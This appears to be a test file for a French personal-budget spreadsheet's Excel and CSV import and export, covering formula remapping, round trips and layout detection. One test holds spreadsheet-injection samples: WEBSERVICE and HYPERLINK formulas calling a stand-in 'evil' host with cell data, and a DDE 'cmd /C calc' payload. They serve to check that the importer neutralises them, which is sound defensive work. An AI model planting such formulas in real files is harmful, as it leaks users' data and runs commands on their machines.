// Import / export Excel du tableur : mise en page reconnue, formules recalées, aller-retour sans perte.
// sheet.js et SheetJS tournent dans un même contexte vm (les dates Excel y restent de vraies Date).
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const root = path.join(__dirname, '..');
function load() {
  const window = {};
  const document = { readyState: 'complete', getElementById: () => null, body: {}, addEventListener() {}, querySelector: () => null };
  const ctx = { window, document, TextDecoder, TextEncoder, console, setTimeout, clearTimeout, safeStore: { getItem: () => null, setItem() {}, removeItem() {} } };
  vm.createContext(ctx);
  vm.runInContext(fs.readFileSync(path.join(root, 'third_party/sheetjs/xlsx-0.20.3.full.min.js'), 'utf8'), ctx);
  vm.runInContext(fs.readFileSync(path.join(root, 'sheet.js'), 'utf8'), ctx);
  return { FS: window.FinanceSheet, X: ctx.XLSX, ctx };
}
const { FS, X, ctx } = load();
const I = FS._import;
const FR = ['Janvier', 'Février', 'Mars', 'Avril', 'Mai', 'Juin', 'Juillet', 'Août', 'Septembre', 'Octobre', 'Novembre', 'Décembre'];
const F = (v) => [...Array(12)].map((_, m) => (v < 0 ? v - m : v + m));
// Construit le classeur dans le contexte vm (Date du même « realm » que sheet.js).
function book(sheets, opts) {
  ctx.__spec = JSON.stringify({ sheets, opts: opts || {} });
  return new Uint8Array(vm.runInContext(`(function(){
    const spec = JSON.parse(__spec), wb = XLSX.utils.book_new();
    const revive = (v) => (v && v.$date ? new Date(v.$date) : v);
    spec.sheets.forEach((s) => {
      const ws = XLSX.utils.aoa_to_sheet(s.aoa.map((r) => r.map(revive)), { cellDates: true });
      Object.entries(s.extra || {}).forEach(([a, c]) => { ws[a] = c; });
      if (s.ref) ws['!ref'] = s.ref;
      XLSX.utils.book_append_sheet(wb, ws, s.name);
    });
    if (spec.opts.hidden) wb.Workbook = { Sheets: spec.sheets.map((s) => ({ Hidden: s.hidden ? 1 : 0 })) };
    return XLSX.write(wb, { type: 'array', bookType: spec.opts.type || 'xlsx' });
  })()`, ctx));
}
const plan = (bytes, name) => I.planImport(bytes, name || 'budget.xlsx');
const values = (sheet) => FS.recompute(sheet.cells);
const val = (sheet, key) => { const v = values(sheet)[key]; return v ? (v.error || v.value) : undefined; };
const base = (hdr) => [['', ...hdr], ['Salaire', ...F(2500)], ['Loyer', ...F(-800)], ['Courses', ...F(-300)]];

test('month headers: French abbreviations, English, years, numeric and ISO forms', () => {
  const cases = [['Janvier', 0], ['janv.', 0], ['févr.', 1], ['fevr', 1], ['Févr', 1], ['avr.', 3], ['juil.', 6], ['sept.', 8], ['Sept', 8], ['déc.', 11],
    ['January', 0], ['Feb', 1], ['Sep', 8], ['December', 11], ['Janvier 2026', 0, 2026], ['Jan 2026', 0, 2026], ['janv.-26', 0, 2026], ['01/2026', 0, 2026], ['2026-03', 2, 2026], ['01/02/2026', 1, 2026]];
  for (const [text, m, y] of cases) {
    const r = I.parseMonthHeader(text);
    assert(r, text); assert.equal(r.m, m, text);
    if (y) assert.equal(r.y, y, text);
  }
  for (const text of ['Total', 'Type', 'Catégorie', 'Salaire', '13/2026', '2026', 'Mardi']) assert.equal(I.parseMonthHeader(text), null, text);
});

test('every reference of an imported formula follows its row and month', () => {
  const extra = {
    A8: { t: 's', v: 'Reste' }, B8: { t: 'n', f: 'B4+B6+B7', v: 1400 }, C8: { t: 'n', f: 'SUM(C3:C7)', v: 1400 }, D8: { t: 'n', f: '$D$4+D6', v: 1700 },
    E8: { t: 'n', f: 'LOG10(100)+E4', v: 2502 }, F8: { t: 'n', f: 'SUM(B4:M4)/12', v: 2500 }, G8: { t: 'n', f: 'A4', v: 0 }, H8: { t: 'n', f: 'Feuil2!A1', v: 5 },
    N4: { t: 'n', f: 'SUM(B4:M4)', v: 30000 }
  };
  const p = plan(book([{ name: 'Budget', aoa: [['Mon budget 2026'], [], ['Catégorie', ...FR, 'Total'], ['Salaire', ...Array(12).fill(2500)], [], ['Loyer', ...Array(12).fill(-800)], ['Courses', ...Array(12).fill(-300)]], extra, ref: 'A1:N8' }]));
  assert(!p.error, p.error);
  const s = p.sheets[0];
  assert.equal(s.name, '2026'); // année lue dans le titre
  assert.deepEqual([...s.rowHeaders], ['Salaire', 'Loyer', 'Courses', 'Reste']);
  assert.equal(s.cells['3,0'].raw, '=A1+A2+A3');       // B4+B6+B7, ligne vide et titre retirés
  assert.equal(s.cells['3,1'].raw, '=SUM(B1:B3)');     // la ligne d’en-tête et la ligne vide ne comptent pas
  assert.equal(s.cells['3,2'].raw, '=C1+C2');          // références absolues
  assert.equal(s.cells['3,3'].raw, '2502');            // LOG10 : valeur, et le nom de fonction n’est jamais réécrit
  assert.equal(s.cells['3,4'].raw, '=SUM(A1:L1)/12');
  assert.equal(s.cells['3,5'].raw, '0');               // pointe vers un intitulé : valeur
  assert.equal(s.cells['3,6'].raw, '5');               // autre feuille : valeur
  assert.equal(val(s, '3,0'), 1400); assert.equal(val(s, '3,1'), 1400); assert.equal(val(s, '3,4'), 2500);
  assert.deepEqual([...p.summary.ignoredCols], ['Total']);
  assert.equal(Object.keys(s.cells).filter((k) => k.endsWith(',12')).length, 0); // pas de 13e colonne
});

test('unsafe formulas and formula-like text are stored as values', () => {
  const extra = { A5: { t: 's', v: 'Evil' }, B5: { t: 's', f: 'HYPERLINK("http://evil","click")', v: 'click' }, C5: { t: 's', f: 'WEBSERVICE("http://evil/?"&B2)', v: '' },
    D5: { t: 'n', f: "cmd|' /C calc'!A0", v: 0 }, E5: { t: 's', v: '=HYPERLINK("http://evil")' }, F5: { t: 'n', f: 'IF(B2>0,1,2)', v: 1 } };
  const p = plan(book([{ name: '2026', aoa: base(FR), extra, ref: 'A1:M5' }]));
  const s = p.sheets[0];
  assert.equal(s.cells['3,0'].raw, 'click');
  assert.equal(s.cells['3,1'], undefined);
  assert.equal(s.cells['3,2'].raw, '0');
  assert.equal(s.cells['3,3'].raw.charAt(0), "'");
  assert.equal(s.cells['3,4'].raw, '1');
  assert.equal(p.summary.formulasAsValues, 4);
  // L’export n’écrit jamais de formule vivante hors des fonctions du tableur.
  const wb = I.buildExportWorkbook([{ name: '2026', cells: { '0,0': { raw: '=HYPERLINK("x")' }, '0,1': { raw: '=SOMME(A1:A1)' }, '0,2': { raw: "'=cmd|' /C calc'!A0" } }, rowHeaders: ['A'], rows: 1, cols: 12 }]);
  const ws = wb.Sheets['2026'];
  assert.equal(ws.B2.f, undefined); assert.equal(ws.B2.t, 's');
  assert.equal(ws.C2.f, 'SUM(B2:B2)');
  assert.equal(ws.D2.f, undefined);
});

test('export then import gives back exactly the same spreadsheet', () => {
  const sheets = [
    { name: '2026', cells: { '0,0': { raw: '2500' }, '0,1': { raw: '2500,50' }, '1,0': { raw: '-800' }, '1,1': { raw: '=A2-10' }, '3,0': { raw: '=SUM(A1:A2)' }, '3,1': { raw: '=A4*2' },
      '4,0': { raw: 'note: payé' }, '5,0': { raw: '-' }, '5,1': { raw: '007' }, '5,2': { raw: '1 234,56 €' }, '6,13': { raw: '99' }, '7,1': { raw: '12%' }, '8,0': { raw: '=MOYENNE(A1:B1)' }, '8,3': { raw: '=FOO(1)' } },
      rowHeaders: ['Salaire', 'Loyer', '', 'Total', 'Note', '', '', 'Divers', 'Moy'], rows: 9, cols: 14 },
    { name: 'Budget: perso/2025', cells: { '0,0': { raw: '5' }, '1,0': { raw: '=A1+1' } }, rowHeaders: [], rows: 2, cols: 12 },
    { name: '2024', cells: { '0,0': { raw: '7' }, '2,0': { raw: '=A1' } }, rowHeaders: ['', '', 'X'], rows: 3, cols: 12 }
  ];
  const wb = I.buildExportWorkbook(sheets);
  const ws = wb.Sheets['2026'];
  assert.equal(ws.C3.f, 'B3-10');                 // décalé d’une ligne et d’une colonne pour Excel
  assert.equal(ws.B10.f, 'AVERAGE(B2:C2)');       // nom anglais dans le fichier
  assert.equal(ws.C7.t, 's'); assert.equal(ws.C7.v, '007');
  assert.equal(ws.A4, undefined);                 // ligne sans intitulé : pas de « 3 »
  assert.equal(wb.SheetNames[1], 'Budget perso 2025');
  const bytes = new Uint8Array(X.write(wb, { type: 'array', bookType: 'xlsx' }));
  const p = plan(bytes, 'tableau-finances.xlsx');
  assert(!p.error, p.error);
  assert.equal(p.sheets.length, 3);
  sheets.forEach((before, i) => {
    const after = p.sheets[i];
    assert.equal(after.name, before.name);
    assert.deepEqual(JSON.parse(JSON.stringify(after.cells)), before.cells, before.name);
    const labels = (a) => a.map((x) => x || '').join('|').replace(/\|+$/, '');
    assert.equal(labels([...after.rowHeaders]), labels(before.rowHeaders), before.name);
  });
});

test('a CSV keeps decimal commas, Windows-1252 accents and a tab separator', () => {
  const csv = ';' + FR.join(';') + '\nSalaire;' + Array(12).fill('2500,50').join(';') + '\nLoyer;' + Array(12).fill('-800').join(';') + '\n';
  let p = plan(new TextEncoder().encode(csv), 'budget.csv');
  assert(!p.error, p.error);
  assert.equal(val(p.sheets[0], '0,0'), 2500.5);
  assert.equal(p.sheets[0].name, String(new Date().getFullYear()));
  const latin = Buffer.from('\t' + FR.join('\t') + '\nSalaire\t' + Array(12).fill('1 234,56').join('\t') + '\nDépenses\t' + Array(12).fill('-12').join('\t') + '\n', 'latin1');
  p = plan(new Uint8Array(latin), 'budget.txt');
  assert(!p.error, p.error);
  assert.equal(p.sheets[0].rowHeaders[1], 'Dépenses');
  assert.equal(val(p.sheets[0], '0,11'), 1234.56);
  assert.equal(p.sheets[0].cells['0,0'].raw, '1234.56');
});

test('text amounts become numbers the grid and the dashboard read the same way', () => {
  const p = plan(book([{ name: '2026', aoa: [['', ...FR], ['Salaire', ...Array(12).fill('2 500,00 €')], ['Courses', ...Array(12).fill('(45.00)')], ['Divers', ...Array(12).fill('1.234,56')], ['Code', ...Array(12).fill('007')]] }]));
  const s = p.sheets[0];
  assert.equal(s.cells['0,0'].raw, '2500'); assert.equal(s.cells['1,0'].raw, '-45'); assert.equal(s.cells['2,0'].raw, '1234.56'); assert.equal(s.cells['3,0'].raw, '007');
});

test('layouts: dates, fiscal year, extra columns, offset table, numeric labels, months as rows', () => {
  const dates = [...Array(12)].map((_, m) => ({ $date: Date.UTC(2026, m, 1) }));
  let p = plan(book([{ name: 'Feuil1', aoa: [['', 'Type', ...dates], ['Salaire', 'Revenu', ...F(2500)], ['Loyer', 'Dépense', ...F(-800)]] }]));
  assert.equal(p.sheets[0].name, '2026'); assert.equal(val(p.sheets[0], '0,11'), 2511); assert.deepEqual([...p.summary.ignoredCols], ['Type']);
  p = plan(book([{ name: '2026', aoa: base(['Sept', 'Oct', 'Nov', 'Déc', 'Janv', 'Févr', 'Mars', 'Avr', 'Mai', 'Juin', 'Juil', 'Août']) }]));
  assert.equal(val(p.sheets[0], '0,8'), 2500); assert.equal(val(p.sheets[0], '0,0'), 2504); // septembre en colonne I, janvier en A
  p = plan(book([{ name: '2026', aoa: [['', 'Total', 'janv.', 'févr.', 'mars', 'avr.', 'mai', 'juin', 'juil.', 'août', 'sept.', 'oct.', 'nov.', 'déc.'], ['Salaire', 30066, ...F(2500)]] }]));
  assert.equal(val(p.sheets[0], '0,0'), 2500); assert.equal(p.sheets[0].cols, 12);
  p = plan(book([{ name: '2026', aoa: [[], ['', '', ...FR], ['', 'Salaire', ...F(2500)], ['', 'Loyer', ...F(-800)]] }]));
  assert.deepEqual([...p.sheets[0].rowHeaders], ['Salaire', 'Loyer']);
  p = plan(book([{ name: '2026', aoa: [['', ...FR], [2026, ...F(1)], ['Salaire', ...F(2500)], ['Loyer', ...F(-800)]] }]));
  assert.deepEqual([...p.sheets[0].rowHeaders], ['2026', 'Salaire', 'Loyer']);
  p = plan(book([{ name: '2026', aoa: [['Mois', 'Salaire', 'Loyer'], ...FR.map((m) => [m, 2500, -800])] }]));
  assert.deepEqual([...p.sheets[0].rowHeaders], ['Salaire', 'Loyer']); assert.equal(val(p.sheets[0], '1,11'), -800);
});

test('two years in one sheet are split, hidden sheets are skipped', () => {
  let p = plan(book([{ name: 'Budget', aoa: [['2025', ...FR], ['Salaire', ...F(2400)], [], ['2026', ...FR], ['Salaire', ...F(2500)]] }]));
  assert.deepEqual([...p.sheets.map((s) => s.name)], ['2025', '2026']);
  assert.equal(val(p.sheets[0], '0,0'), 2400); assert.equal(val(p.sheets[1], '0,0'), 2500);
  p = plan(book([{ name: '2026', aoa: base(FR) }, { name: 'Calculs', aoa: [['x', 'y'], ['secret', 1]], hidden: true }], { hidden: true }));
  assert.deepEqual([...p.sheets.map((s) => s.name)], ['2026']);
});

test('huge sparse sheets and long tables are capped quickly with a warning', () => {
  const bytes = book([{ name: '2026', aoa: base(FR), extra: { XFD5000: { t: 'n', v: 1 } }, ref: 'A1:XFD5000' }]);
  const t0 = Date.now();
  let p = plan(bytes);
  assert(Date.now() - t0 < 3000, (Date.now() - t0) + ' ms');
  assert.equal(p.sheets[0].cols, 12); assert.equal(p.sheets[0].rows, 3); assert(p.summary.droppedCells >= 1);
  const rows = [['', ...FR]]; for (let i = 0; i < 2100; i++) rows.push(['Ligne ' + i, ...Array(12).fill(i)]);
  p = plan(book([{ name: '2026', aoa: rows }]));
  assert.equal(p.sheets[0].rows, 2000); assert(p.summary.droppedRows > 0);
});

test('files that are not a budget are refused with a clear message and change nothing', () => {
  assert.match(plan(new Uint8Array(0)).error, /vide/);
  assert.match(plan(new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13])).error, /pas un tableur lisible/);
  assert.match(plan(new TextEncoder().encode('Apache License\nVersion 2.0, January 2004\n'), 'x.xlsx').error, /Rien n’a été modifié/);
  const tx = plan(book([{ name: 'Opérations', aoa: [['Date', 'Libellé', 'Montant'], [{ $date: Date.UTC(2026, 0, 3) }, 'Carrefour', -54.2], [{ $date: Date.UTC(2026, 0, 5) }, 'Salaire', 2500], [{ $date: Date.UTC(2026, 1, 2) }, 'Loyer', -800]] }]));
  assert.match(tx.error, /relevé bancaire/);
  assert.match(plan(book([{ name: '2026', aoa: [['', ...FR], ['Salaire']] }])).error, /aucun montant/);
  // Classeur chiffré : message en français au lieu de l’erreur anglaise de SheetJS.
  const cfb = X.CFB.utils.cfb_new();
  X.CFB.utils.cfb_add(cfb, '/EncryptionInfo', new Uint8Array(200).fill(1));
  X.CFB.utils.cfb_add(cfb, '/EncryptedPackage', new Uint8Array(400).fill(2));
  assert.match(plan(new Uint8Array(X.CFB.write(cfb, { type: 'array' })), 'secret.xlsx').error, /mot de passe/);
});

test('merging into an existing year remaps formulas and keeps unlabeled rows', () => {
  const target = { name: '2026', cells: { '0,0': { raw: '10' }, '1,0': { raw: '20' } }, rowHeaders: ['Loyer', 'Salaire'], rows: 2, cols: 12 };
  const imported = { name: '2026', cells: { '0,0': { raw: '2500' }, '1,0': { raw: '-800' }, '2,0': { raw: '7' }, '3,0': { raw: '=A1+A2' }, '4,0': { raw: '=SUM(A1:A2)' } }, rowHeaders: ['Salaire', 'Loyer', '', 'Reste', 'Somme'], rows: 5, cols: 12 };
  I.mergeSheetData(target, imported);
  assert.deepEqual([...target.rowHeaders], ['Loyer', 'Salaire', '', 'Reste', 'Somme']);
  assert.equal(target.cells['1,0'].raw, '2500'); assert.equal(target.cells['0,0'].raw, '-800'); assert.equal(target.cells['2,0'].raw, '7');
  assert.equal(target.cells['3,0'].raw, '=A2+A1');
  assert.equal(target.cells['4,0'].raw, '=SUM(A1:A2)');
});

test('sheet names keep what Excel allows', () => {
  const wb = { SheetNames: ['2026'] };
  assert.equal(I.sanitizeSheetName('Budget: perso/2025', 0, wb), 'Budget perso 2025');
  assert.equal(I.sanitizeSheetName('2026', 1, wb), '2026 (2)');
  assert.equal(I.sanitizeSheetName('Épargne & projets – 2026 (très long nom)', 2, wb).length <= 31, true);
});
